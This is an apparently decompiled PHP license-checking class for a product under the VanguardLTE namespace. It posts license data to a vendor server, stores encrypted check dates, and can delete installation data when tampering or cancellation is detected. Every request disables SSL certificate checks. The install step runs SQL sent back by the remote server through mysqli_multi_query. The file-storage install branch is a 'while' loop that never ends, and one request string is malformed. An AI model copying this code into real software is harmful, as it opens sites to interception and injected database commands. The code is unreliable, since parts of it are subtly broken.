<?php 
namespace VanguardLTE\Lib
{
    class LicenseDK
    {
        public function aplCustomEncrypt($string, $key)
        {
            $encrypted_string = null;
            if( !empty($string) && !empty($key) ) 
            {
                $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
                $encrypted_string = openssl_encrypt($string, 'aes-256-cbc', $key, 0, $iv);
                $encrypted_string = base64_encode($encrypted_string . '::' . $iv);
            }
            return $encrypted_string;
        }
        public function aplCustomDecrypt($string, $key)
        {
            $decrypted_string = null;
            if( !empty($string) && !empty($key) ) 
            {
                $string = base64_decode($string);
                if( stristr($string, '::') ) 
                {
                    $string_iv_array = explode('::', $string, 2);
                    if( !empty($string_iv_array) && count($string_iv_array) == 2 ) 
                    {
                        list($encrypted_string, $iv) = $string_iv_array;
                        $decrypted_string = openssl_decrypt($encrypted_string, 'aes-256-cbc', $key, 0, $iv);
                    }
                }
            }
            return $decrypted_string;
        }
        public function aplValidateIntegerValue($number, $min_value = 0, $max_value = INF)
        {
            $result = false;
            if( !is_float($number) && filter_var($number, FILTER_VALIDATE_INT, [
                'options' => [
                    'min_range' => $min_value, 
                    'max_range' => $max_value
                ]
            ]) !== false ) 
            {
                $result = true;
            }
            return $result;
        }
        public function aplValidateRawDomain($url)
        {
            $result = false;
            if( !empty($url) ) 
            {
                if( preg_match('/^[a-z0-9-.]+\.[a-z\.]{2,7}$/', strtolower($url)) ) 
                {
                    $result = true;
                }
                else
                {
                    $result = false;
                }
            }
            return $result;
        }
        public function aplGetCurrentUrl($remove_last_slash = null)
        {
            $protocol = 'http';
            $host = null;
            $script = null;
            $params = null;
            $current_url = null;
            if( isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' ) 
            {
                $protocol = 'https';
            }
            if( isset($_SERVER['HTTP_HOST']) ) 
            {
                $host = $_SERVER['HTTP_HOST'];
            }
            if( isset($_SERVER['SCRIPT_NAME']) ) 
            {
                $script = $_SERVER['SCRIPT_NAME'];
            }
            if( isset($_SERVER['QUERY_STRING']) ) 
            {
                $params = $_SERVER['QUERY_STRING'];
            }
            if( !empty($protocol) && !empty($host) && !empty($script) ) 
            {
                $current_url = $protocol . '://' . $host . $script;
                if( !empty($params) ) 
                {
                    $current_url .= ('?' . $params);
                }
                if( $remove_last_slash == 1 ) 
                {
                    while( substr($current_url, -1) == '/' ) 
                    {
                        $current_url = substr($current_url, 0, -1);
                    }
                }
            }
            return $current_url;
        }
        public function aplGetRawDomain($url)
        {
            $raw_domain = null;
            if( !empty($url) ) 
            {
                $url_array = parse_url($url);
                if( empty($url_array['scheme']) ) 
                {
                    $url = 'http://' . $url;
                    $url_array = parse_url($url);
                }
                if( !empty($url_array['host']) ) 
                {
                    $raw_domain = $url_array['host'];
                    $raw_domain = trim(str_ireplace('www.', '', filter_var($raw_domain, FILTER_SANITIZE_URL)));
                }
            }
            return $raw_domain;
        }
        public function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
        {
            if( filter_var($url, FILTER_VALIDATE_URL) ) 
            {
                $url_array = parse_url($url);
                $url = str_ireplace($url_array['scheme'] . '://', '', $url);
                if( $remove_path == 1 ) 
                {
                    $first_slash_position = stripos($url, '/');
                    if( $first_slash_position > 0 ) 
                    {
                        $url = substr($url, 0, $first_slash_position + 1);
                    }
                }
                else
                {
                    $last_slash_position = strripos($url, '/');
                    if( $last_slash_position > 0 ) 
                    {
                        $url = substr($url, 0, $last_slash_position + 1);
                    }
                }
                if( $remove_scheme != 1 ) 
                {
                    $url = $url_array['scheme'] . '://' . $url;
                }
                if( $remove_www == 1 ) 
                {
                    $url = str_ireplace('www.', '', $url);
                }
                if( $remove_last_slash == 1 ) 
                {
                    while( substr($url, -1) == '/' ) 
                    {
                        $url = substr($url, 0, -1);
                    }
                }
            }
            return trim($url);
        }
        public function aplCustomPost($url, $post_info = null, $refer = null)
        {
            $user_agent = 'phpmillion cURL';
            $connect_timeout = 10;
            $server_response_array = [];
            $formatted_headers_array = [];
            if( filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info) ) 
            {
                if( empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL) ) 
                {
                    $refer = $url;
                }
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout);
                curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout);
                curl_setopt($ch, CURLOPT_REFERER, $refer);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLINFO_HEADER_OUT, true);
                curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($curl, $header) use (&$formatted_headers_array)
                {
                    $len = strlen($header);
                    $header = explode(':', $header, 2);
                    if( count($header) < 2 ) 
                    {
                        return $len;
                    }
                    $name = strtolower(trim($header[0]));
                    $formatted_headers_array[$name] = trim($header[1]);
                    return $len;
                });
                $result = curl_exec($ch);
                $information = curl_getinfo($ch);
                $curl_error = curl_error($ch);
                curl_close($ch);
                $server_response_array['headers'] = $formatted_headers_array;
                $server_response_array['error'] = $curl_error;
                $server_response_array['body'] = $result;
            }
            return $server_response_array;
        }
        public function aplVerifyDateTime($datetime, $format)
        {
            $result = false;
            if( !empty($datetime) && !empty($format) ) 
            {
                $datetime = \DateTime::createFromFormat($format, $datetime);
                $errors = \DateTime::getLastErrors();
                if( $datetime && empty($errors['warning_count']) ) 
                {
                    $result = true;
                }
            }
            return $result;
        }
        public function aplGetDaysBetweenDates($date_from, $date_to)
        {
            $number_of_days = 0;
            if( $this->aplVerifyDateTime($date_from, 'Y-m-d') && $this->aplVerifyDateTime($date_to, 'Y-m-d') ) 
            {
                $date_to = new \DateTime($date_to);
                $date_from = new \DateTime($date_from);
                $number_of_days = $date_from->diff($date_to)->format('%a');
            }
            return $number_of_days;
        }
        public function aplParseXmlTags($content, $tag_name)
        {
            $parsed_value = null;
            if( !empty($content) && !empty($tag_name) ) 
            {
                preg_match_all('/<' . preg_quote($tag_name, '/') . '>(.*?)<\/' . preg_quote($tag_name, '/') . '>/ims', $content, $output_array, PREG_SET_ORDER);
                if( !empty($output_array[0][1]) ) 
                {
                    $parsed_value = trim($output_array[0][1]);
                }
            }
            return $parsed_value;
        }
        public function aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
        {
            $notifications_array = [];
            if( !empty($content_array) ) 
            {
                if( !empty($content_array['headers']['notification_server_signature']) && $this->aplVerifyServerSignature($content_array['headers']['notification_server_signature'], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) ) 
                {
                    $notifications_array['notification_case'] = $content_array['headers']['notification_case'];
                    $notifications_array['notification_text'] = $content_array['headers']['notification_text'];
                    if( !empty($content_array['headers']['notification_data']) ) 
                    {
                        $notifications_array['notification_data'] = json_decode($content_array['headers']['notification_data'], true);
                    }
                }
                else
                {
                    $notifications_array['notification_case'] = 'notification_invalid_response';
                    $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_INVALID_RESPONSE');
                }
            }
            else
            {
                $notifications_array['notification_case'] = 'notification_no_connection';
                $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_NO_CONNECTION');
            }
            return $notifications_array;
        }
        public function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
        {
            $script_signature = null;
            $root_ips_array = gethostbynamel($this->aplGetRawDomain(config('LicenseDK.APL_ROOT_URL')));
            if( !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array) ) 
            {
                $script_signature = hash('sha256', gmdate('Y-m-d') . $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE . config('LicenseDK.APL_PRODUCT_ID') . implode('', $root_ips_array));
            }
            return $script_signature;
        }
        public function aplVerifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
        {
            $result = false;
            $root_ips_array = gethostbynamel($this->aplGetRawDomain(config('LicenseDK.APL_ROOT_URL')));
            if( !empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array) && hash('sha256', implode('', $root_ips_array) . config('LicenseDK.APL_PRODUCT_ID') . $LICENSE_CODE . $CLIENT_EMAIL . $ROOT_URL . gmdate('Y-m-d')) == $notification_server_signature ) 
            {
                $result = true;
            }
            return $result;
        }
        public function aplCheckSettings()
        {
            $notifications_array = [];
            if( !config('LicenseDK.APL_SALT') || config('LicenseDK.APL_SALT') == 'some_random_text' ) 
            {
                $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_SALT');
            }
            if( !filter_var(config('LicenseDK.APL_ROOT_URL'), FILTER_VALIDATE_URL) || !ctype_alnum(substr(config('LicenseDK.APL_ROOT_URL'), -1)) ) 
            {
                $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_ROOT_URL');
            }
            if( !filter_var(config('LicenseDK.APL_PRODUCT_ID'), FILTER_VALIDATE_INT) ) 
            {
                $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID');
            }
            if( !$this->aplValidateIntegerValue(config('LicenseDK.APL_DAYS'), 1, 365) ) 
            {
                $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD');
            }
            if( config('LicenseDK.APL_STORAGE') != 'DATABASE' && config('LicenseDK.APL_STORAGE') != 'FILE' ) 
            {
                $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_STORAGE');
            }
            if( config('LicenseDK.APL_STORAGE') == 'DATABASE' && !ctype_alnum(str_ireplace(['_'], '', config('LicenseDK.APL_DATABASE_TABLE'))) ) 
            {
                $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_TABLE');
            }
            if( config('LicenseDK.APL_STORAGE') == 'FILE' && !@is_writable(@config('LicenseDK.APL_DIRECTORY') . '/' . @config('LicenseDK.APL_LICENSE_FILE_LOCATION')) ) 
            {
                $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE');
            }
            if( config('LicenseDK.APL_ROOT_IP') && !filter_var(config('LicenseDK.APL_ROOT_IP'), FILTER_VALIDATE_IP) ) 
            {
                $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_ROOT_IP');
            }
            if( config('LicenseDK.APL_ROOT_IP') && !in_array(config('LicenseDK.APL_ROOT_IP'), gethostbynamel($this->aplGetRawDomain(config('LicenseDK.APL_ROOT_URL')))) ) 
            {
                $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_DNS');
            }
            if( defined('APL_ROOT_NAMESERVERS') && APL_ROOT_NAMESERVERS ) 
            {
                foreach( APL_ROOT_NAMESERVERS as $nameserver ) 
                {
                    if( !$this->aplValidateRawDomain($nameserver) ) 
                    {
                        $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_ROOT_NAMESERVERS');
                        break;
                    }
                }
            }
            if( defined('APL_ROOT_NAMESERVERS') && APL_ROOT_NAMESERVERS ) 
            {
                $apl_root_nameservers_array = APL_ROOT_NAMESERVERS;
                $fetched_nameservers_array = [];
                $dns_records_array = dns_get_record($this->aplGetRawDomain(config('LicenseDK.APL_ROOT_URL')), DNS_NS);
                foreach( $dns_records_array as $record ) 
                {
                    $fetched_nameservers_array[] = $record['target'];
                }
                $apl_root_nameservers_array = array_map('strtolower', $apl_root_nameservers_array);
                $fetched_nameservers_array = array_map('strtolower', $fetched_nameservers_array);
                sort($apl_root_nameservers_array);
                sort($fetched_nameservers_array);
                if( $apl_root_nameservers_array != $fetched_nameservers_array ) 
                {
                    $notifications_array[] = config('LicenseDK.APL_CORE_NOTIFICATION_INVALID_DNS');
                }
            }
            return $notifications_array;
        }
        public function aplParseLicenseDKFile()
        {
            $license_data_array = [];
            if( @is_readable(@config('LicenseDK.APL_DIRECTORY') . '/' . @config('LicenseDK.APL_LICENSE_FILE_LOCATION')) ) 
            {
                $file_content = file_get_contents(config('LicenseDK.APL_DIRECTORY') . '/' . config('LicenseDK.APL_LICENSE_FILE_LOCATION'));
                preg_match_all('/<([A-Z_]+)>(.*?)<\/([A-Z_]+)>/', $file_content, $matches, PREG_SET_ORDER);
                if( !empty($matches) ) 
                {
                    foreach( $matches as $value ) 
                    {
                        if( !empty($value[1]) && $value[1] == $value[3] ) 
                        {
                            $license_data_array[$value[1]] = $value[2];
                        }
                    }
                }
            }
            return $license_data_array;
        }
        public function aplGetLicenseDKData($MYSQLI_LINK = null)
        {
            $settings_row = [];
            if( config('LicenseDK.APL_STORAGE') == 'DATABASE' ) 
            {
                $settings_results = @mysqli_query($MYSQLI_LINK, 'SELECT * FROM ' . @config('LicenseDK.APL_DATABASE_TABLE'));
                $settings_row = @mysqli_fetch_assoc($settings_results);
            }
            if( config('LicenseDK.APL_STORAGE') == 'FILE' ) 
            {
                $settings_row = $this->aplParseLicenseDKFile();
            }
            return $settings_row;
        }
        public function aplCheckConnection()
        {
            $notifications_array = [];
            $content_array = $this->aplCustomPost(config('LicenseDK.APL_ROOT_URL') . '/apl_callbacks/connection_test.php', 'product_id=' . rawurlencode(config('LicenseDK.APL_PRODUCT_ID')) . '&connection_hash=' . rawurlencode(hash('sha256', 'connection_test')));
            if( !empty($content_array) ) 
            {
                if( $content_array['body'] != '<connection_test>OK</connection_test>' ) 
                {
                    $notifications_array['notification_case'] = 'notification_invalid_response';
                    $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_INVALID_RESPONSE');
                }
            }
            else
            {
                $notifications_array['notification_case'] = 'notification_no_connection';
                $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_NO_CONNECTION');
            }
            return $notifications_array;
        }
        public function aplCheckData($MYSQLI_LINK = null)
        {
            $error_detected = 0;
            $cracking_detected = 0;
            $data_check_result = false;
            extract($this->aplGetLicenseDKData($MYSQLI_LINK));
            if( !empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD) ) 
            {
                $LCD = $this->aplCustomDecrypt($LCD, config('LicenseDK.APL_SALT') . $INSTALLATION_KEY);
                $LRD = $this->aplCustomDecrypt($LRD, config('LicenseDK.APL_SALT') . $INSTALLATION_KEY);
                if( !filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1)) ) 
                {
                    $error_detected = 1;
                }
                if( filter_var($this->aplGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr($this->aplGetRootUrl($this->aplGetCurrentUrl(), 1, 1, 0, 1), $this->aplGetRootUrl($ROOT_URL . '/', 1, 1, 0, 1)) === false ) 
                {
                    $error_detected = 1;
                }
                if( empty($INSTALLATION_HASH) || $INSTALLATION_HASH != hash('sha256', $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE) ) 
                {
                    $error_detected = 1;
                }
                if( empty($INSTALLATION_KEY) || !password_verify($LRD, $this->aplCustomDecrypt($INSTALLATION_KEY, config('LicenseDK.APL_SALT') . $ROOT_URL)) ) 
                {
                    $error_detected = 1;
                }
                if( !$this->aplVerifyDateTime($LCD, 'Y-m-d') ) 
                {
                    $error_detected = 1;
                }
                if( !$this->aplVerifyDateTime($LRD, 'Y-m-d') ) 
                {
                    $error_detected = 1;
                }
                if( $this->aplVerifyDateTime($LCD, 'Y-m-d') && date('Y-m-d', strtotime('+1 day')) < $LCD ) 
                {
                    $error_detected = 1;
                    $cracking_detected = 1;
                }
                if( $this->aplVerifyDateTime($LRD, 'Y-m-d') && date('Y-m-d', strtotime('+1 day')) < $LRD ) 
                {
                    $error_detected = 1;
                    $cracking_detected = 1;
                }
                if( $this->aplVerifyDateTime($LCD, 'Y-m-d') && $this->aplVerifyDateTime($LRD, 'Y-m-d') && $LRD < $LCD ) 
                {
                    $error_detected = 1;
                    $cracking_detected = 1;
                }
                if( $cracking_detected == 1 && config('LicenseDK.APL_DELETE_CRACKED') == 'YES' ) 
                {
                    $this->aplDeleteData($MYSQLI_LINK);
                }
                if( $error_detected != 1 && $cracking_detected != 1 ) 
                {
                    $data_check_result = true;
                }
            }
            return $data_check_result;
        }
        public function aplVerifyEnvatoPurchase($LICENSE_CODE = null)
        {
            $notifications_array = [];
            $content_array = $this->aplCustomPost(config('LicenseDK.APL_ROOT_URL') . '/apl_callbacks/verify_envato_purchase.php', 'product_id=' . rawurlencode(config('LicenseDK.APL_PRODUCT_ID')) . '&license_code=' . rawurlencode($LICENSE_CODE) . '&connection_hash=' . rawurlencode(hash('sha256', 'verify_envato_purchase')));
            if( !empty($content_array) ) 
            {
                if( $content_array['body'] != '<verify_envato_purchase>OK</verify_envato_purchase>' ) 
                {
                    $notifications_array['notification_case'] = 'notification_invalid_response';
                    $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_INVALID_RESPONSE');
                }
            }
            else
            {
                $notifications_array['notification_case'] = 'notification_no_connection';
                $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_NO_CONNECTION');
            }
            return $notifications_array;
        }
        public function aplInstallLicenseDK($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK = null)
        {
            $notifications_array = [];
            $apl_core_notifications = $this->aplCheckSettings();
            if( empty($apl_core_notifications) ) 
            {
                if( $this->aplGetLicenseDKData($MYSQLI_LINK) && is_array($this->aplGetLicenseDKData($MYSQLI_LINK)) ) 
                {
                    $notifications_array['notification_case'] = 'notification_already_installed';
                    $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED');
                }
                else
                {
                    $INSTALLATION_HASH = hash('sha256', $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE);
                    $post_info = 'product_id=' . rawurlencode(config('LicenseDK.APL_PRODUCT_ID')) . '&client_email=' . rawurlencode($CLIENT_EMAIL) . '&license_code=' . rawurlencode($LICENSE_CODE) . '&root_url=' . rawurlencode($ROOT_URL) . '&installation_hash=' . rawurlencode($INSTALLATION_HASH) . '&license_signature=' . rawurlencode($this->aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
                    $content_array = $this->aplCustomPost(config('LicenseDK.APL_ROOT_URL') . '/apl_callbacks/license_install.php', $post_info, $ROOT_URL);
                    $notifications_array = $this->aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
                    if( $notifications_array['notification_case'] == 'notification_license_ok' ) 
                    {
                        $INSTALLATION_KEY = $this->aplCustomEncrypt(password_hash(date('Y-m-d'), PASSWORD_DEFAULT), config('LicenseDK.APL_SALT') . $ROOT_URL);
                        $LCD = $this->aplCustomEncrypt(date('Y-m-d', strtotime('-' . config('LicenseDK.APL_DAYS') . ' days')), config('LicenseDK.APL_SALT') . $INSTALLATION_KEY);
                        $LRD = $this->aplCustomEncrypt(date('Y-m-d'), config('LicenseDK.APL_SALT') . $INSTALLATION_KEY);
                        if( config('LicenseDK.APL_STORAGE') == 'DATABASE' ) 
                        {
                            $content_array = $this->aplCustomPost(config('LicenseDK.APL_ROOT_URL') . '/apl_callbacks/license_scheme.php', $post_info, $ROOT_URL);
                            $notifications_array = $this->aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
                            if( !empty($notifications_array['notification_data']) && !empty($notifications_array['notification_data']['scheme_query']) ) 
                            {
                                $mysql_bad_array = [
                                    '%config(\'LicenseDK.APL_DATABASE_TABLE\')%', 
                                    '%ROOT_URL%', 
                                    '%CLIENT_EMAIL%', 
                                    '%LICENSE_CODE%', 
                                    '%LCD%', 
                                    '%LRD%', 
                                    '%INSTALLATION_KEY%', 
                                    '%INSTALLATION_HASH%'
                                ];
                                $mysql_good_array = [
                                    config('LicenseDK.APL_DATABASE_TABLE'), 
                                    $ROOT_URL, 
                                    $CLIENT_EMAIL, 
                                    $LICENSE_CODE, 
                                    $LCD, 
                                    $LRD, 
                                    $INSTALLATION_KEY, 
                                    $INSTALLATION_HASH
                                ];
                                $license_scheme = str_replace($mysql_bad_array, $mysql_good_array, $notifications_array['notification_data']['scheme_query']);
                                mysqli_multi_query($MYSQLI_LINK, $license_scheme) or                                 exit( mysqli_error($MYSQLI_LINK) );
                            }
                        }
                        while( config('LicenseDK.APL_STORAGE') == 'FILE' ) 
                        {
                            $handle = @fopen(@config('LicenseDK.APL_DIRECTORY') . '/' . @config('LicenseDK.APL_LICENSE_FILE_LOCATION'), 'w+');
                            $fwrite = @fwrite($handle, '<ROOT_URL>' . $ROOT_URL . '</ROOT_URL><CLIENT_EMAIL>' . $CLIENT_EMAIL . '</CLIENT_EMAIL><LICENSE_CODE>' . $LICENSE_CODE . '</LICENSE_CODE><LCD>' . $LCD . '</LCD><LRD>' . $LRD . '</LRD><INSTALLATION_KEY>' . $INSTALLATION_KEY . '</INSTALLATION_KEY><INSTALLATION_HASH>' . $INSTALLATION_HASH . '</INSTALLATION_HASH>');
                            if( $fwrite === false ) 
                            {
                                echo config('LicenseDK.APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR');
                                exit();
                            }
                            @fclose($handle);
                        }
                    }
                }
            }
            else
            {
                $notifications_array['notification_case'] = 'notification_script_corrupted';
                $notifications_array['notification_text'] = implode('; ', $apl_core_notifications);
            }
            return $notifications_array;
        }
        public function aplVerifyLicenseDK($MYSQLI_LINK = null, $FORCE_VERIFICATION = 0)
        {
            $notifications_array = [];
            $update_lrd_value = 0;
            $update_lcd_value = 0;
            $updated_records = 0;
            $apl_core_notifications = $this->aplCheckSettings();
            if( empty($apl_core_notifications) ) 
            {
                if( $this->aplCheckData($MYSQLI_LINK) ) 
                {
                    extract($this->aplGetLicenseDKData($MYSQLI_LINK));
                    if( $this->aplGetDaysBetweenDates($this->aplCustomDecrypt($LCD, config('LicenseDK.APL_SALT') . $INSTALLATION_KEY), date('Y-m-d')) < config('LicenseDK.APL_DAYS') && $this->aplCustomDecrypt($LCD, config('LicenseDK.APL_SALT') . $INSTALLATION_KEY) <= date('Y-m-d') && $this->aplCustomDecrypt($LRD, config('LicenseDK.APL_SALT') . $INSTALLATION_KEY) <= date('Y-m-d') && $FORCE_VERIFICATION === 0 ) 
                    {
                        $notifications_array['notification_case'] = 'notification_license_ok';
                        $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_BYPASS_VERIFICATION');
                    }
                    else
                    {
                        $post_info = 'product_id=' . rawurlencode(config('LicenseDK.APL_PRODUCT_ID')) . '&client_email=' . rawurlencode($CLIENT_EMAIL) . '&license_code=' . rawurlencode($LICENSE_CODE) . '&root_url=' . rawurlencode($ROOT_URL) . '&installation_hash=' . rawurlencode($INSTALLATION_HASH) . '&license_signature=' . rawurlencode($this->aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
                        $content_array = $this->aplCustomPost(config('LicenseDK.APL_ROOT_URL') . '/apl_callbacks/license_verify.php', $post_info, $ROOT_URL);
                        $notifications_array = $this->aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
                        if( $notifications_array['notification_case'] == 'notification_license_ok' ) 
                        {
                            $update_lcd_value = 1;
                        }
                        if( $notifications_array['notification_case'] == 'notification_license_cancelled' && config('LicenseDK.APL_DELETE_CANCELLED') == 'YES' ) 
                        {
                            $this->aplDeleteData($MYSQLI_LINK);
                        }
                    }
                    if( $this->aplCustomDecrypt($LRD, config('LicenseDK.APL_SALT') . $INSTALLATION_KEY) < date('Y-m-d') ) 
                    {
                        $update_lrd_value = 1;
                    }
                    if( $update_lrd_value == 1 || $update_lcd_value == 1 ) 
                    {
                        if( $update_lcd_value == 1 ) 
                        {
                            $LCD = date('Y-m-d');
                        }
                        else
                        {
                            $LCD = $this->aplCustomDecrypt($LCD, config('LicenseDK.APL_SALT') . $INSTALLATION_KEY);
                        }
                        $INSTALLATION_KEY = $this->aplCustomEncrypt(password_hash(date('Y-m-d'), PASSWORD_DEFAULT), config('LicenseDK.APL_SALT') . $ROOT_URL);
                        $LCD = $this->aplCustomEncrypt($LCD, config('LicenseDK.APL_SALT') . $INSTALLATION_KEY);
                        $LRD = $this->aplCustomEncrypt(date('Y-m-d'), config('LicenseDK.APL_SALT') . $INSTALLATION_KEY);
                        if( config('LicenseDK.APL_STORAGE') == 'DATABASE' ) 
                        {
                            $stmt = mysqli_prepare($MYSQLI_LINK, 'UPDATE ' . config('LicenseDK.APL_DATABASE_TABLE') . ' SET LCD=?, LRD=?, INSTALLATION_KEY=?');
                            if( $stmt ) 
                            {
                                mysqli_stmt_bind_param($stmt, 'sss', $LCD, $LRD, $INSTALLATION_KEY);
                                $exec = mysqli_stmt_execute($stmt);
                                $affected_rows = mysqli_stmt_affected_rows($stmt);
                                if( $affected_rows > 0 ) 
                                {
                                    $updated_records = $updated_records + $affected_rows;
                                }
                                mysqli_stmt_close($stmt);
                            }
                            if( $updated_records < 1 ) 
                            {
                                echo config('LicenseDK.APL_NOTIFICATION_DATABASE_WRITE_ERROR');
                                exit();
                            }
                        }
                        if( config('LicenseDK.APL_STORAGE') == 'FILE' ) 
                        {
                            $handle = @fopen(@config('LicenseDK.APL_DIRECTORY') . '/' . @config('LicenseDK.APL_LICENSE_FILE_LOCATION'), 'w+');
                            $fwrite = @fwrite($handle, '<ROOT_URL>' . $ROOT_URL . '</ROOT_URL><CLIENT_EMAIL>' . $CLIENT_EMAIL . '</CLIENT_EMAIL><LICENSE_CODE>' . $LICENSE_CODE . '</LICENSE_CODE><LCD>' . $LCD . '</LCD><LRD>' . $LRD . '</LRD><INSTALLATION_KEY>' . $INSTALLATION_KEY . '</INSTALLATION_KEY><INSTALLATION_HASH>' . $INSTALLATION_HASH . '</INSTALLATION_HASH>');
                            if( $fwrite === false ) 
                            {
                                echo config('LicenseDK.APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR');
                                exit();
                            }
                            @fclose($handle);
                        }
                    }
                }
                else
                {
                    $notifications_array['notification_case'] = 'notification_license_corrupted';
                    $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_LICENSE_CORRUPTED');
                }
            }
            else
            {
                $notifications_array['notification_case'] = 'notification_script_corrupted';
                $notifications_array['notification_text'] = implode('; ', $apl_core_notifications);
            }
            return $notifications_array;
        }
        public function aplVerifySupport($MYSQLI_LINK = null)
        {
            $notifications_array = [];
            $apl_core_notifications = $this->aplCheckSettings();
            if( empty($apl_core_notifications) ) 
            {
                if( $this->aplCheckData($MYSQLI_LINK) ) 
                {
                    extract($this->aplGetLicenseDKData($MYSQLI_LINK));
                    $post_info = 'product_id = ' . rawurlencode(config('LicenseDK.APL_PRODUCT_ID')) . '&client_email=' . rawurlencode($CLIENT_EMAIL) . '&license_code=' . rawurlencode($LICENSE_CODE) . '&root_url=' . rawurlencode($ROOT_URL) . '&installation_hash=' . rawurlencode($INSTALLATION_HASH) . '&license_signature=' . rawurlencode($this->aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
                    $content_array = $this->aplCustomPost(config('LicenseDK.APL_ROOT_URL') . '/apl_callbacks/license_support.php', $post_info, $ROOT_URL);
                    $notifications_array = $this->aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
                }
                else
                {
                    $notifications_array['notification_case'] = 'notification_license_corrupted';
                    $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_LICENSE_CORRUPTED');
                }
            }
            else
            {
                $notifications_array['notification_case'] = 'notification_script_corrupted';
                $notifications_array['notification_text'] = implode('; ', $apl_core_notifications);
            }
            return $notifications_array;
        }
        public function aplVerifyUpdates($MYSQLI_LINK = null)
        {
            $notifications_array = [];
            $apl_core_notifications = $this->aplCheckSettings();
            if( empty($apl_core_notifications) ) 
            {
                if( $this->aplCheckData($MYSQLI_LINK) ) 
                {
                    extract($this->aplGetLicenseDKData($MYSQLI_LINK));
                    $post_info = 'product_id=' . rawurlencode(config('LicenseDK.APL_PRODUCT_ID')) . '&client_email=' . rawurlencode($CLIENT_EMAIL) . '&license_code=' . rawurlencode($LICENSE_CODE) . '&root_url=' . rawurlencode($ROOT_URL) . '&installation_hash=' . rawurlencode($INSTALLATION_HASH) . '&license_signature=' . rawurlencode($this->aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
                    $content_array = $this->aplCustomPost(config('LicenseDK.APL_ROOT_URL') . '/apl_callbacks/license_updates.php', $post_info, $ROOT_URL);
                    $notifications_array = $this->aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
                }
                else
                {
                    $notifications_array['notification_case'] = 'notification_license_corrupted';
                    $notifications_array['notification_text'] = config('LicenseDK.APL_NOTIFICATION_LICENSE_CORRUPTED');
                }
            }
            else
            {
                $notifications_array['notification_case'] = 'notification_script_corrupted';
                $notifications_array['notification_text'] = implode('; ', $apl_core_notifications);
            }
            return $notifications_array;
        }
